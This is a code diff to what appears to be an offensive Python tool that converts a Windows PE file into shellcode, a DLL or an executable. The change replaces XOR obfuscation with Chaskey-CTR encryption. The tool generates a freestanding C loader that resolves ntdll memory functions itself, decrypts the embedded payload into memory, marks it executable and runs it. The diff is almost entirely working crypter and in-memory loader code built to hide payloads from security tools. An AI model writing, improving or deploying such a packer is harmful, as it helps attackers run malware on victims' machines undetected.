@@ -3,45 +3,57 @@ import sys
 import subprocess
 import textwrap
 import base64
-import random
+import struct
 
+# Chaskey block & PRF to generate CTR keystream
+def ROTL(x, b):
+    return ((x >> (32 - b)) | (x << b)) & 0xFFFFFFFF
+
+def chaskey_block(v, k):
+    v0, v1, v2, v3 = v
+    k0, k1, k2, k3 = k
+    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
+    for _ in range(8):
+        v0 = (v0 + v1) & 0xFFFFFFFF
+        v1 = ROTL(v1, 5) ^ v0
+        v0 = ROTL(v0, 16)
+        v2 = (v2 + v3) & 0xFFFFFFFF
+        v3 = ROTL(v3, 8) ^ v2
+        v0 = (v0 + v3) & 0xFFFFFFFF
+        v3 = ROTL(v3, 13) ^ v0
+        v2 = (v2 + v1) & 0xFFFFFFFF
+        v1 = ROTL(v1, 7) ^ v2
+        v2 = ROTL(v2, 16)
+    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
+    return (v0, v1, v2, v3)
+
+def chaskey_prf(key_bytes, block_bytes):
+    k = struct.unpack("<4I", key_bytes)
+    v = struct.unpack("<4I", block_bytes)
+    out = chaskey_block(v, k)
+    return struct.pack("<4I", *out)
+
+def chaskey_ctr_keystream(key, nonce, length):
+    stream = bytearray()
+    ctr = 0
+    while len(stream) < length:
+        block = nonce + struct.pack("<Q", ctr)
+        stream.extend(chaskey_prf(key, block))
+        ctr += 1
+    return bytes(stream[:length])
+
+# --- CLI and I/O ---
 if len(sys.argv) < 3:
-    script_name = os.path.basename(sys.argv[0])
-    print(f"Usage: {script_name} <input_pe> <output.bin> [-exe|-dll] [-xor] [-l <key_length>] [-k <key>] [-base64]")
+    print(f"Usage: {os.path.basename(sys.argv[0])} <input_pe> <output.bin> [-exe|-dll] [-encrypt] [-base64]")
     sys.exit(1)
 
-args = [arg.lower() for arg in sys.argv]
-
+args = [a.lower() for a in sys.argv]
 input_pe = sys.argv[1]
 output_bin = sys.argv[2]
+use_encrypt = "-encrypt" in args
 use_exe = "-exe" in args
 use_dll = "-dll" in args
 use_b64 = "-base64" in args or "-b64" in args
-
-use_xor = "-xor" in args or "-l" in args or "-k" in args
-
-key_length = 1
-key = [random.randint(1, 255) for _ in range(key_length)]
-
-if "-l" in args:
-    l_index = args.index("-l")
-    key_length = int(sys.argv[l_index + 1], 0)
-    key = [random.randint(1, 255) for _ in range(key_length)]
-
-if "-k" in args:
-    k_value = sys.argv[sys.argv.index("-k") + 1]
-
-    if "," in k_value:
-        key = [int(b, 0) for b in k_value.split(",")]
-    elif k_value.startswith("0x") and len(k_value) > 2:
-        hex_str = k_value[2:]
-        if len(hex_str) % 2 != 0:
-            hex_str = "0" + hex_str
-        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
-    else:
-        key = [int(k_value, 0)]
-
-    key_length = len(key)
 
 with open(input_pe, "rb") as f:
     pe_bytes = f.read()
@@ -50,61 +62,128 @@ if len(pe_bytes) < 2 or pe_bytes[:2] != b"MZ":
     print("[-] Input is not a valid PE (missing MZ header)")
     sys.exit(1)
 
-data_bytes = pe_bytes
-if use_xor:
-    data_bytes = bytes(pe_bytes[i] ^ key[i % key_length] for i in range(len(pe_bytes)))
+if use_encrypt:
+    chaskey_key = os.urandom(16)
+    chaskey_nonce = os.urandom(8)
+    keystream = chaskey_ctr_keystream(chaskey_key, chaskey_nonce, len(pe_bytes))
+    data_bytes = bytes(p ^ k for p, k in zip(pe_bytes, keystream))
+else:
+    data_bytes = pe_bytes
 
 hex_array = ", ".join(f"0x{b:02x}" for b in data_bytes)
 
-if use_xor:
-    key_literal = ", ".join(f"0x{b:02x}" for b in key)
+if use_encrypt:
+    key_literal = ", ".join(f"0x{b:02x}" for b in chaskey_key)
+    nonce_literal = ", ".join(f"0x{b:02x}" for b in chaskey_nonce)
     c_source = textwrap.dedent(f"""
     #include "pe_loader.h"
-
-    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
-        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-
-    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
-        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+    typedef unsigned long long u64;
+    typedef unsigned long u32;
 
     __attribute__((section(".text")))
-    unsigned char pe_blob[] = {{
+    static unsigned char enc_blob[] = {{
         {hex_array}
     }};
 
     __attribute__((section(".text")))
-    unsigned char xor_key[{key_length}] = {{{key_literal}}};
+    static unsigned char chaskey_key[16] = {{{key_literal}}};
+
+    __attribute__((section(".text")))
+    static unsigned char chaskey_nonce[8] = {{{nonce_literal}}};
+
+    #define ROTL(x,b) (((x) >> (32 - (b))) | ((x) << (b)))
+
+    void chaskey_block(u32 v[4], u32 k[4]) {{
+        int i;
+        for(i=0;i<4;i++) v[i] ^= k[i];
+        for(i=0;i<8;i++) {{
+            v[0] += v[1]; v[1] = ROTL(v[1],5) ^ v[0]; v[0] = ROTL(v[0],16);
+            v[2] += v[3]; v[3] = ROTL(v[3],8) ^ v[2];
+            v[0] += v[3]; v[3] = ROTL(v[3],13) ^ v[0];
+            v[2] += v[1]; v[1] = ROTL(v[1],7) ^ v[2]; v[2] = ROTL(v[2],16);
+        }}
+        for(i=0;i<4;i++) v[i] ^= k[i];
+    }}
+
+    void chaskey_prf(unsigned char in[16], unsigned char out[16]) {{
+        u32 v[4], k[4];
+        int i;
+        for(i=0;i<4;i++) {{
+            v[i] = ((u32*)in)[i];
+            k[i] = ((u32*)chaskey_key)[i];
+        }}
+        chaskey_block(v, k);
+        for(i=0;i<4;i++) ((u32*)out)[i] = v[i];
+    }}
+
+    void decrypt_blob(unsigned char *dst) {{
+        u64 ctr = 0;
+        unsigned char blk[16], ks[16];
+        unsigned int i,j;
+        for(i = 0; i < sizeof(enc_blob); i += 16) {{
+            for(j=0; j<8; j++) blk[j] = chaskey_nonce[j];
+            for(j=0; j<8; j++) blk[8+j] = ((unsigned char*)(&ctr))[j];
+            chaskey_prf(blk, ks);
+            for(j=0; j<16 && (i+j) < sizeof(enc_blob); j++)
+                dst[i+j] = enc_blob[i+j] ^ ks[j];
+            ctr++;
+        }}
+    }}
 
     __attribute__((section(".text.start")))
     void _start(void) {{
         HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
-        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
+        typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
+            HANDLE ProcessHandle,
+            PVOID *BaseAddress,
+            ULONG_PTR ZeroBits,
+            PSIZE_T RegionSize,
+            ULONG AllocationType,
+            ULONG Protect
+        );
+
+        typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
+            HANDLE ProcessHandle,
+            PVOID *BaseAddress,
+            PSIZE_T RegionSize,
+            ULONG NewProtect,
+            PULONG OldProtect
+        );
+
+        NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
             (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
 
-        NtProtectVirtualMemory_t pNtProtectVirtualMemory =
+        NtProtectVirtualMemory_t NtProtectVirtualMemory =
             (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
 
+        SIZE_T size = sizeof(enc_blob);
         PVOID pe = NULL;
-        SIZE_T size = sizeof(pe_blob);
 
-        pNtAllocateVirtualMemory(
-            (HANDLE)-1, &pe, 0, &size,
-            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        NtAllocateVirtualMemory(
+            (HANDLE)-1,
+            &pe,
+            0,
+            &size,
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_READWRITE
+        );
 
-        unsigned char *buf = (unsigned char*)pe;
-
-        for (SIZE_T i = 0; i < sizeof(pe_blob); i++)
-            buf[i] = pe_blob[i] ^ xor_key[i % {key_length}];
+        decrypt_blob((unsigned char*)pe);
 
         ULONG oldProt;
-        pNtProtectVirtualMemory(
-            (HANDLE)-1, &pe, &size,
-            PAGE_EXECUTE_READ, &oldProt);
+        NtProtectVirtualMemory(
+            (HANDLE)-1,
+            &pe,
+            &size,
+            PAGE_EXECUTE_READ,
+            &oldProt
+        );
 
         ExecuteFromMemory(pe);
     }}
     """)
+
 else:
     c_source = textwrap.dedent(f"""
     #include "pe_loader.h"
@@ -121,10 +200,8 @@ else:
     """)
 
 output_file = output_bin if use_exe or use_dll else "temp_compile.exe"
-
 compile_cmd = [
-    "x86_64-w64-mingw32-gcc",
-    "-x", "c", "-",
+    "x86_64-w64-mingw32-gcc", "-x", "c", "-",
     "-nostdlib", "-nostartfiles", "-ffreestanding",
     "-Wl,-subsystem,windows", "-e", "_start",
     "-Os", "-s",
@@ -136,7 +213,6 @@ compile_cmd = [
 
 if use_dll:
     compile_cmd.extend(["-shared", "-Wl,--exclude-all-symbols"])
-
 if not use_exe and not use_dll:
     compile_cmd.extend(["-T", "linker.ld"])
 
@@ -146,8 +222,6 @@ try:
         input=c_source.encode(),
         check=True
     )
-
-    suffix = f" (XOR key: {','.join(f'0x{b:02X}' for b in key)})" if use_xor else ""
 
     if not use_exe and not use_dll:
         subprocess.run(
@@ -161,9 +235,9 @@ try:
                 b = f.read()
             with open(output_bin, "w") as f:
                 f.write(base64.b64encode(b).decode())
-            print(f"[+] Base64 shellcode generated: {output_bin}{suffix}")
+            print(f"[+] Base64 shellcode generated: {output_bin}")
         else:
-            print(f"[+] Shellcode generated: {output_bin}{suffix}")
+            print(f"[+] Shellcode generated: {output_bin}")
 
     elif use_dll:
         if use_b64:
@@ -171,9 +245,9 @@ try:
                 b = f.read()
             with open(output_file, "w") as f:
                 f.write(base64.b64encode(b).decode())
-            print(f"[+] Base64 DLL generated: {output_file}{suffix}")
+            print(f"[+] Base64 DLL generated: {output_file}")
         else:
-            print(f"[+] DLL generated: {output_file}{suffix}")
+            print(f"[+] DLL generated: {output_file}")
 
     else:
         if use_b64:
@@ -181,9 +255,9 @@ try:
                 b = f.read()
             with open(output_file, "w") as f:
                 f.write(base64.b64encode(b).decode())
-            print(f"[+] Base64 executable generated: {output_file}{suffix}")
+            print(f"[+] Base64 executable generated: {output_file}")
         else:
-            print(f"[+] Executable generated: {output_file}{suffix}")
+            print(f"[+] Executable generated: {output_file}")
 
 except subprocess.CalledProcessError:
     sys.exit(1)
